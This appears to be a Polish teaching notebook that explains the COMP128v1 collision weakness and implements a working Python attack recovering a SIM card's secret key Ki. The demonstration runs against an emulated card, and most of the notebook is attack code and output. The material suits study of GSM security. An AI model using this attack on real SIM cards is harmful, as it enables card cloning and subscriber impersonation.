{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Klonowanie kart SIM\n",
    "\n",
    "Klonowanie jest możliwe tylko dla kart, które mają wbudowany algorytm **COMP128v1**. Pozostałe wersje COMP128 są uważane za bezpieczne."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## COMP128\n",
    "\n",
    "Wywołanie COMP128 ma postać\n",
    "$$ (res[4], sesion\\_key[8]) = COMP128( secret\\_key[16], RAND[16])$$\n",
    "gdzie w nawiasach podano rozmiary zmiennych wyrażone w bajtach. Klucz sesyjny generowany przez COMP128 ma nominalnie długość $64$ bitów. Jednak algorytmy COMP128v1 i COMP128v2 były tak skontruowane, że 10 najmłodszych bitów jest zerowanych, zatem klucz sesyjny wygenerowany za ich pomocą ma efektywną długość $56$ bitów.\n",
    "\n",
    "Do obliczania funkcji COMP128 wykorzystano bibliotekę [CryptoMobile](https://github.com/mitshell/CryptoMobile) (w zawartych tam kodach źródłowych `comp128.c` opisano historię ujawnienia tej pierwotnie tajnej funkcji). Poniżej podano kilka wektorów testowych (pobranych z niezależnego źródła) i porównano z wynikami obliczeń\n",
    "\n",
    "\n",
    "```\n",
    "|                 Ki               |               RAND               |         [RES Kc]         |\n",
    "|__________________________________|__________________________________|__________________________|\n",
    "| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | 00000000000000000000000000000000 | 0E9FF8FF24119D2D4ED18C00 |\n",
    "| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | 00102030405060708090A0B0C0D0E0F0 | A9D961ADC7633CE8768C4800 |\n",
    "| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF | C0AED303A34148CBBFA06C00 |\n",
    "| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | 000102030405060708090A0B0C0D0E0F | 5D2A043E67B7C5C7C3356C00 |\n",
    "```\n",
    "\n",
    "Poniższy kod źródłowy pokazuje jak sprawdzić poprawność działania wykorzystywanej implementacji."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ki: b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' RAND: b'00000000000000000000000000000000' out: b'0e9ff8ff24119d2d4ed18c00'\n",
      "Ki: b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' RAND: b'00102030405060708090a0b0c0d0e0f0' out: b'a9d961adc7633ce8768c4800'\n",
      "Ki: b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' RAND: b'ffffffffffffffffffffffffffffffff' out: b'c0aed303a34148cbbfa06c00'\n",
      "Ki: b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' RAND: b'000102030405060708090a0b0c0d0e0f' out: b'5d2a043e67b7c5c7c3356c00'\n"
     ]
    }
   ],
   "source": [
    "import binascii\n",
    "from pycomp128 import comp128v1\n",
    "Ki = binascii.unhexlify(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')\n",
    "RAND = binascii.unhexlify(b'00000000000000000000000000000000')\n",
    "res, Kc = comp128v1(Ki, RAND)\n",
    "print(\"Ki:\", binascii.hexlify(Ki), \"RAND:\", binascii.hexlify(RAND), \"out:\", binascii.hexlify(res+Kc))\n",
    "RAND = binascii.unhexlify(b'00102030405060708090A0B0C0D0E0F0')\n",
    "res, Kc = comp128v1(Ki, RAND)\n",
    "print(\"Ki:\", binascii.hexlify(Ki), \"RAND:\", binascii.hexlify(RAND), \"out:\", binascii.hexlify(res+Kc))\n",
    "RAND = binascii.unhexlify(b'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF')\n",
    "res, Kc = comp128v1(Ki, RAND)\n",
    "print(\"Ki:\", binascii.hexlify(Ki), \"RAND:\", binascii.hexlify(RAND), \"out:\", binascii.hexlify(res+Kc))\n",
    "RAND = binascii.unhexlify(b'000102030405060708090A0B0C0D0E0F')\n",
    "res, Kc = comp128v1(Ki, RAND)\n",
    "print(\"Ki:\", binascii.hexlify(Ki), \"RAND:\", binascii.hexlify(RAND), \"out:\", binascii.hexlify(res+Kc))\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Teoria\n",
    "\n",
    "W publikacjach [Handschuh, H., Paillier, P. (2000). Reducing the Collision Probability of Alleged Comp128](https://link.springer.com/chapter/10.1007/10721064_34) (istotny jest wstęp) i [Wray S. (2003). COMP128: A Birthday Surprise](http://www.stuartwray.net/comp128-a-birthday-surprise-rev.pdf) (sekcja 2 opisuje przebieg ataku)\n",
    "dość dokładnie przeanalizowano działanie algorytmu i przebieg ataku.\n",
    "Jego ideę pozwalającą na odzyskanie bajtów $K_i[0]$ i $K_i[8]$ klucza zapisanego na karcie można streścić następująco\n",
    "\n",
    "1. Wybieramy dowolną wartość początkową $RAND$. \n",
    "2. W tym punkcie odpytujemy **kartę SIM** o wynik obliczeń. W liczbie $RAND$ zmieniamy tylko bajty $RAND[0]$ i $RAND[8]$ (kolejne warianty liczby oznaczmy jako $RAND_k$). Bajty zmieniamy aż do momentu znalezienia kolizji, tj. gdy znajdziemy dwie różne $RAND_1$ i $RAND_2$, które dają ten sam wynik obliczeń:\n",
    "$$ sim(RAND_1) == sim(RAND_2)\\ . $$\n",
    "3. Gdy wyczerpane zostaną wszystkie kombinacje, a kolizji nie będzie, to wracamy do pkt. 1 i wybieramy nowy $RAND$. Gdy dla kilku $RAND$ się nie powiedzie, to znaczy, że klucz $K_i$ nie jest podatny na atak (patrz publikacje). W przeciwnym razie mamy dwie wartości $RAND_1$ i $RAND_2$, które dają kolizję dla nieznanego klucza. Występowanie kolizji jest uwarunkowane głównie wartościami bajtów $K_i[0]$ i $K_i[8]$ (na tym właśnie polega słabość *COMP128v1*). Możemy zatem poszukać tej pary bajtów, nie dbając o wartość pozostałych bajtów klucza.\n",
    "4. Teraz do obliczeń używamy funkcji *COMP128v1*. Zaczynamy od pewnego dowolnego $K$, w którym zmieniamy wartości bajtów $K[0]$ i $K[8]$. Oznaczmy kolejne warianty testowego klucza przez $K_n$. Naszym celem jest znalezienie takich wartości $K_n[0]$ i $K_n[8]$, które zapewniają kolizję, tzn.\n",
    "$$ comp128v1( K_n, RAND_1) == comp128v1( K_n, RAND_2)\\ . $$\n",
    "Bajty $K_n[0]$ i $K_n[8]$, które zapewniają kolizję, są z dużym prawdopodobieństwem tożsame z bajtami klucza zapisanego na karcie SIM tj. z $K_i[0]=K_n[0]$ i $K_i[8]=K_n[8]$.\n",
    "5. Wracamy do punktu 1. i poszukujemy wartości bajtów $K_i[1]$ i $K_i[9]$. Proces powtarzamy, aż do znalezienia wszystkich bajtów klucza zapisanego na karcie.\n",
    "\n",
    "Złożoność ataku nie jest duża. Na każdą parę bajtów klucza musimy wykonać $2^{16}$ wywołań karty SIM i $2\\times 2^{16}$ obliczeń *COMP128v1*. Podstawowe ograniczenie czasowe wynika z powolnej komunikacji z kartą SIM. Gdy karta SIM jest symulowana programowo, jak w poniższym przykładzie, to atak przebiega bardzo szybko.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Implementacja"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Struktury danych"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`comp128_query` to adaptacja implementacji bibliotecznej. `comp128_query` zwraca wynik obliczeń jako jeden ciąg bajtów, bez rozbicia na elementy składowe. \n",
    "\n",
    "`SimCard` to klasa emulująca zachowanie karty SIM. W konstruktorze podajemy klucz (który jest niedostępny dla algorytmu łamiącego). Obiekt ma jedną metodę obliczającą odpowiedź na wyzwanie $RAND$."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sim response: b'0e9ff8ff24119d2d4ed18c00'\n",
      "Sim response: b'a9d961adc7633ce8768c4800'\n",
      "Sim response: b'c0aed303a34148cbbfa06c00'\n",
      "Sim response: b'5d2a043e67b7c5c7c3356c00'\n",
      "Prównaj z wynikami wcześniejszych obliczeń\n"
     ]
    }
   ],
   "source": [
    "import binascii\n",
    "from pycomp128 import comp128v1\n",
    "\n",
    "def comp128_query(key, rand):\n",
    "  tuple = comp128v1(key, rand)\n",
    "  return tuple[0]+tuple[1]\n",
    "  \n",
    "class SimCard:\n",
    "  def __init__(self, secret_key):\n",
    "    self.key = secret_key\n",
    "  def a3a8( self, rand ):\n",
    "    return comp128_query(self.key, rand)\n",
    "\n",
    "Sim = SimCard(binascii.unhexlify(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'))\n",
    "\n",
    "test_challenges = (b'00000000000000000000000000000000', b'00102030405060708090A0B0C0D0E0F0', b'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF', b'000102030405060708090A0B0C0D0E0F')\n",
    "for challengestr in test_challenges:\n",
    "  challenge = binascii.unhexlify(challengestr)\n",
    "  response = Sim.a3a8( challenge )\n",
    "  print(\"Sim response:\", binascii.hexlify( response ))\n",
    "print(\"Prównaj z wynikami wcześniejszych obliczeń\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Emulacja karty SIM\n",
    "\n",
    "Kartę SIM, którą dalej będziemy atakować, inicjujemy losowym kluczem tajnym (tak przynajmniej powinien zachować się operator, czy tak jest — nie wiadomo, bo wartości kluczy nie są znane użytkownikom). Wartość klucza jest zapamiętana w zmiennej dla poźniejszego porównania.\n",
    "\n",
    "**Pamiętaj!** atak nie działa dla wszystkich kluczy. Jeżeli się nie powiedzie, wróć tutaj i wylosuj klucz ponownie."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "K_i: b'8163e40f6c9f150253c16a7ac127af93' K_i[0]: 0x81 K_i[8]: 0x53\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "K_i = os.urandom(16)\n",
    "print(\"K_i:\", binascii.hexlify( K_i ), \"K_i[0]:\", hex(K_i[0]), \"K_i[8]:\", hex(K_i[8]) )\n",
    "Sim =  SimCard( K_i )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Poszukiwanie kolizji dla wyzwań RAND przy ustalonym kluczu $K_i$\n",
    "\n",
    "Poszukujemy liczb RAND dających kolizję i różniących się między sobą tylko na 0-wym i 8-mym bajcie.  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "RAND pattern: b'21d0f9e882b6f3a2866f86d5f20f7852'\n",
      "Collision found!\n",
      "35426 0x8a62\n",
      "35426\n"
     ]
    }
   ],
   "source": [
    "import os,sys\n",
    "\n",
    "rand_k = bytearray(os.urandom(16))\n",
    "print(\"RAND pattern:\",binascii.hexlify(rand_k))\n",
    "dictionary = {}\n",
    "rand_collision = False\n",
    "\n",
    "for num in range(0xffff+1):\n",
    "  num_as_bytes = num.to_bytes(2,sys.byteorder)\n",
    "  rand_k[0]=num_as_bytes[0]\n",
    "  rand_k[8]=num_as_bytes[1]\n",
    "  # odpowiedzi przedstawione są jako ciągi znaków,\n",
    "  # aby łatwo móc się posłużyć obiektem słownika\n",
    "  response = binascii.hexlify( Sim.a3a8( bytes(rand_k) ) )\n",
    "  if response in dictionary: # mamy kolizję, zapisz liczby i zakończ\n",
    "    rand1=dictionary.get(response)\n",
    "    rand2=binascii.hexlify( rand_k )\n",
    "    rand_collision=True\n",
    "    break\n",
    "  else: # brak kolizji, zapisz do słownika, wyzwania i odpowiedzi konwertowane są na ciągi znaków\n",
    "    dictionary[response]=binascii.hexlify( rand_k )\n",
    "if ( rand_collision ):\n",
    "  print(\"Collision found!\")\n",
    "else:\n",
    "  print(\"No collision!\")\n",
    "print(num,hex(num))\n",
    "print(len(dictionary))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Powyższy fragment można uruchomić wiele razy. Proszę zwrócić uwagę, że liczba iteracji niezbędnych do znalezienia kolizji **NIE ZALEŻY** od wyboru początkowej wartości RAND (można wybrać same zera!), zależy natomiast od postaci klucza na karcie SIM (aby to zobaczyć, trzeba się wrócić dwa kroki w tył i ponownie wylosować klucz)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Poszukiwanie klucza dającego kolizję\n",
    "\n",
    "Z poprzedniego punktu mamy wyzwania zapewniające kolizję. Występowanie kolizji jest zależne tylko od właściwości klucza. \n",
    "Z dużym prawdopodobieństwem kolizja jest zdeterminowana tylko przez bajty $K_i[0]$ i $K_i[8]$.\n",
    "Aby je wyznaczyć, zaczynamy od dowolnego klucza i poszukujemy zestawu bajtów $K_i[0]$ i $K_i[8]$, które dają kolizję."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Search failed\n"
     ]
    }
   ],
   "source": [
    "rnd1 = binascii.unhexlify(rand1)\n",
    "rnd2 = binascii.unhexlify(rand2)\n",
    "K_n = bytearray(16) #bytearray(os.urandom(16))\n",
    "for keybytes in range(0xffff+1):\n",
    "  keybytes_as_bytes = keybytes.to_bytes(2,sys.byteorder)\n",
    "  K_n[0]=keybytes_as_bytes[0]\n",
    "  K_n[8]=keybytes_as_bytes[1]\n",
    "  resp1 = comp128_query(bytes( K_n ), rnd1) # wartości rand1 i rand2 pochodzą z poprzedniego punktu\n",
    "  resp2 = comp128_query(bytes( K_n ), rnd2)\n",
    "  if ( resp1 == resp2 ): # collision found\n",
    "    print(\"resp1:\", binascii.hexlify( resp1 ) )\n",
    "    print(\"resp2:\", binascii.hexlify( resp2 ) )\n",
    "    print(\"Alleged key bytes: K_n[0]=\", hex(K_n[0]), \"K_n[8]=\", hex(K_n[8]))\n",
    "    print(\"SECRET  key bytes: K_i[0]:\", hex(K_i[0]), \"K_i[8]:\", hex(K_i[8]) )\n",
    "    break\n",
    "if ( keybytes == 0xffff ):\n",
    "  print(\"Search failed\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Odzyskanie całego klucza\n",
    "\n",
    "W poprzednich punktach odzyskaliśmy bajty \"K_i[0]\" i \"K_i[8]\" tajnego klucza zapisanego na karcie SIM. Pozostałe bajty klucza odzyskujemy, powtarzając powyższą procedurę dla bajtów \"RAND_k[n]\" i \"RAND_k[n+8]\" oraz \"K_i[n]\" i \"K_i[n+8]\" dla $n=1,\\ldots,7$."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Zdefiniujmy poprzednie zabiegi mające na celu znalezienie kolizji jako podfunkcje."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def findRands( Sim, index):\n",
    "  rand_k = bytearray(os.urandom(16))\n",
    "  #rand_k = bytearray(16)\n",
    "  dictionary = {}\n",
    "  rand_collision = False\n",
    "  for num in range(0xffff+1):\n",
    "    num_as_bytes = num.to_bytes(2,sys.byteorder)\n",
    "    rand_k[0+index]=num_as_bytes[0]\n",
    "    rand_k[8+index]=num_as_bytes[1]\n",
    "    response = binascii.hexlify( Sim.a3a8( bytes(rand_k) ) )\n",
    "    if response in dictionary:\n",
    "      rand1=dictionary.get(response)\n",
    "      rand2=binascii.hexlify( rand_k )\n",
    "      return rand1, rand2\n",
    "    else:\n",
    "      dictionary[response]=binascii.hexlify( rand_k )\n",
    "  return\n",
    "\n",
    "def findKeyBytes(rnd1,rnd2,index):\n",
    "  sample_key = bytearray(16) #bytearray(os.urandom(16))\n",
    "  for keybytes in range(0xffff+1):\n",
    "    keybytes_as_bytes = keybytes.to_bytes(2,sys.byteorder)\n",
    "    sample_key[0+index]=keybytes_as_bytes[0]\n",
    "    sample_key[8+index]=keybytes_as_bytes[1]\n",
    "    if ( comp128_query(bytes(sample_key), rnd1) == comp128_query(bytes(sample_key), rnd2) ): # collision found\n",
    "      #print (hex(keybytes_as_bytes[0]),hex(keybytes_as_bytes[1]))\n",
    "      return keybytes_as_bytes[0], keybytes_as_bytes[1]  \n",
    "  #print (\"No matching key bytes found\")\n",
    "  return # no key found\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Poniższy kod ilustruje odzyskiwanie kolejnych bajtów tajnego klucza."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "def BreakingSIM( sim ):\n",
    "  AllegedKey=bytearray(16)\n",
    "  print(\"Initial key\")\n",
    "  print(binascii.hexlify( AllegedKey ))\n",
    "  for k in range(8):\n",
    "    rands = findRands(Sim,k)\n",
    "    if rands:\n",
    "      keybytes = findKeyBytes(binascii.unhexlify(rands[0]),binascii.unhexlify(rands[1]),k)\n",
    "      if keybytes:\n",
    "        AllegedKey[k]=keybytes[0]\n",
    "        AllegedKey[8+k]=keybytes[1]  \n",
    "        print(binascii.hexlify( AllegedKey ))\n",
    "      else:\n",
    "        print(\"Key not found on pos:\", k )\n",
    "        AllegedKey[k]=0\n",
    "        AllegedKey[8+k]=0  \n",
    "        print(binascii.hexlify( AllegedKey ))\n",
    "    else:\n",
    "      print(\"Rands not found on pos:\", k )\n",
    "      AllegedKey[k]=0\n",
    "      AllegedKey[8+k]=0  \n",
    "      print(binascii.hexlify( AllegedKey ))\n",
    "  return AllegedKey\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Pamiętaj!** Nie wszystkie klucze są podatne. Być może będziesz musiał uruchomić poniższy fragment kilkukrotnie."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Secret key K_i\n",
      "b'052a3c3b8ae78270525c966ece681542'\n",
      "Initial key\n",
      "b'00000000000000000000000000000000'\n",
      "b'05000000000000005200000000000000'\n",
      "b'052a000000000000525c000000000000'\n",
      "b'052a3c0000000000525c960000000000'\n",
      "b'052a3c3b00000000525c966e00000000'\n",
      "b'052a3c3b8a000000525c966ece000000'\n",
      "b'052a3c3b8ae70000525c966ece680000'\n",
      "b'052a3c3b8ae78200525c966ece681500'\n",
      "b'052a3c3b8ae78270525c966ece681542'\n",
      "Done. Compare with the secret key.\n"
     ]
    }
   ],
   "source": [
    "import os,sys,binascii\n",
    "from pycomp128 import comp128v1\n",
    "K_i = os.urandom(16)\n",
    "#K_i = binascii.unhexlify(b'200a09e23623ff3a16858054defe97c2')\n",
    "print(\"Secret key K_i\")\n",
    "print(binascii.hexlify( K_i ))\n",
    "Sim =  SimCard( K_i )\n",
    "AllegedKey = BreakingSIM( Sim )\n",
    "print(\"Done. Compare with the secret key.\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "d4d1e4263499bec80672ea0156c357c1ee493ec2b1c70f0acce89fc37c4a6abe"
  },
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
